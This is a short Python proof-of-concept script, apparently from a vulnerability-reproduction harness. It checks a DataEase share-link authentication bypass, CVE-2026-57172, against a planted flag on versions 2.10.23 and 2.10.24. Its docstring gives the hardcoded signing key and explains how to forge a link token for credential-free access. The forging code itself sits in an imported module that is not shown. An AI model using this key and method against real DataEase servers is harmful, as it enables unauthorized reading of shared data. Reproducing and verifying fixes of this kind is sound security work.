#!/usr/bin/env python3
"""RESIDUAL / BYPASS PoC -- CVE-2026-57172 (incomplete fix of CVE-2024-52295).

The 2.10.2 patch removed the hardcoded MAIN-AUTH signing key but the SIBLING
ShareLink signing key stayed hardcoded as 'link-pwd-fit2cloud' in
ShareSecretManage.defaultPwd (via @Value("${dataease.default-link-pwd:link-pwd-fit2cloud}"))
right up to 2.10.23. For any passwordless share, TokenFilter verifies the
linkToken with HMAC256(getSecret()) which falls back to that hardcoded default.

Forge a linkToken (X-DE-LINK-TOKEN) signed with 'link-pwd-fit2cloud' for the
(uid, resourceId, oid) of a passwordless share and read the planted flag over
external HTTP with NO credentials.

  reaches flag @ v1 = 2.10.23  (residual hardcoded key still in effect)
  blocked      @ v2 = 2.10.24  (key now a random per-install secret persisted
                                to share-secret.json -> forged sig invalid)

Usage: python3 bypass_poc.py <base_url>
"""
import os, sys
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from oracle import residual_probe

if __name__ == "__main__":
    base = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:18123"
    status, hit = residual_probe(base)
    print(f"[residual/CVE-2026-57172] {base} -> HTTP {status}, flag_reached={hit and status==200}")
    sys.exit(0 if (hit and status == 200) else 1)
